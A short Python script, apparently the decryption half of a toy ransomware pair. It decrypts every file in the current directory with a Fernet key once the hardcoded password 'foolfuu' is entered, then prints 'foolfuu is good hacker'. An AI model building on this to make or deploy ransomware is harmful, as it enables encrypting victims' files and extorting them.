import os
from cryptography.fernet import Fernet
#

files = []

for file in os.listdir():
	if file == "erfun.py" or file == "thekey.key" or file == "drfun.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()


password = "foolfuu"
user_password = input("Enter the password for open files\n")
if user_password == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("foolfuu is good hacker")

else:
	print('no password')
